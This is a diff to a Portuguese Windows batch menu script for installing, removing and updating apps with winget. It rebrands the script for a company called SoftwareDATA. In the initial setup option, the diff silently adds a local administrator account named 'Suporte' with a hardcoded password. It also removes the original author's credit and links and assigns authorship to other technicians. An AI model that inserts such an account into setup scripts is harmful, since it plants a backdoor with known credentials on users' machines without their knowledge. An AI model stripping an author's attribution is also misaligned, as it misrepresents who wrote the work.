@@ -26,7 +26,7 @@ echo ===========================================================================
 echo #                                                                                                             #
 echo #  Lembre de atualizar o aplicativo "instalador de aplicativo" na Microsoft Store antes de executar o script, #
 echo #  caso contrário não funcionará                                                                              #
-echo #                                                                                                             #
+echo #                                                                                  por Suporte SoftwareDATA   #
 echo ===============================================================================================================
 pause
 goto menu
@@ -34,7 +34,7 @@ goto menu
 :menu
 cls
 echo ===============================================================================================================
-echo #                                              Menu Scripts 1.5                                               #
+echo #                                     Menu Scripts 1.5 SoftwareDATA Edition                                   #
 echo ===============================================================================================================
 echo #                                                                                                             #
 echo #                                            Selecione uma opção:                                             #
@@ -48,7 +48,7 @@ echo #                                         6 - Pesquisar Apps               
 echo #                                         7 - Atualizar Apps                                                  #
 echo #                                         8 - Sobre                                                           #
 echo #                                         0 - Sair                                                            #
-echo #                                                                                                             #
+echo #                                                                                  por Suporte SoftwareDATA   #
 echo ===============================================================================================================
 set /p opcao=Opção:
 if "%opcao%"=="1" goto inicial
@@ -65,6 +65,8 @@ goto menu
 :inicial
 cls
 powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
+net user Suporte compaq9740 /add
+net localgroup Administradores Suporte /add
 call :desinstalar X
 call :instalar Y
 winget upgrade --all --include-unknown
@@ -74,7 +76,7 @@ goto menu
 :limpar
 cls
 :desinstalar
-winget uninstall 9NBLGGH4QGHW 9NBLGGH4R32N 9WZDNCRD29V9 9WZDNCRFHVFW 9P1J8S7CCWWT Microsoft.OneDrive Microsoft.Todos_8wekyb3d8bbwe Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe Microsoft.GamingApp_8wekyb3d8bbwe --accept-source-agreements
+winget uninstall 9NBLGGH4QGHW 9NBLGGH4R32N 9WZDNCRD29V9 9WZDNCRFHVFW 9P1J8S7CCWWT 9WZDNCRDTBJJ Microsoft.OneDrive Microsoft.Todos_8wekyb3d8bbwe Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe Microsoft.GamingApp_8wekyb3d8bbwe --accept-source-agreements
 winget uninstall Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe Microsoft.MixedReality.Portal_8wekyb3d8bbwe Microsoft.Office.OneNote_8wekyb3d8bbwe Microsoft.SkypeApp_kzf8qxf38zg5c Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe Microsoft.XboxApp_8wekyb3d8bbwe Microsoft.OneDrive 9WZDNCRDTBJJ 9NBLGGH42THS --accept-source-agreements
 winget uninstall 9NBLGGH4QGHW --accept-source-agreements
 winget uninstall 9WZDNCRDTBJJ
@@ -261,23 +263,16 @@ goto sobre
 cls
 echo ===============================================================================================================
 echo #                                                                                                             #
-echo #    Este script foi desenvolvido Por Fal_Gamerr, obrigado a RyanK_, Samuca e Ofernandofilo por auxiliar na   #
-echo # criação do script.                                                                                          #
+echo #    Este script foi desenvolvido pelo técnico Fabrício Yan com a ajuda dos técnicos Ryan e Samuel para uso   #
+echo # de suporte TI da empresa visando a maior desempenho dos serviços do laboratório.                            #
 echo #    Compatível com Windows 10 e 11 com a última versão do instalador de aplicativos da Microsoft Store.      #
-echo #    Caso queira contribuir com o projeto com uma doação, doe para a chave pix: falgamerr@gmail.com           #
 echo #                                                                                                             #
 echo #                                               1 - Site oficial                                              #
-echo #                                               2 - Checar atualizações                                       #
-echo #                                               3 - Canal no Youtube                                          #
-echo #                                               4 - Instagram                                                 #
 echo #                                               0 - Voltar                                                    #
 echo #                                                                                                             #
 echo ===============================================================================================================
 set /p opcao=Opcao:
 if "%opcao%"=="1" start https://github.com/FalGamerr/Menu-Scripts
-if "%opcao%"=="2" start https://github.com/FalGamerr/Menu-Scripts/releases/
-if "%opcao%"=="3" start https://youtube.com/user/FalGamerr
-if "%opcao%"=="4" start https://instagram.com/fabricio.yan.mm/
 if "%opcao%"=="0" goto sobre
 pause
 goto sobre
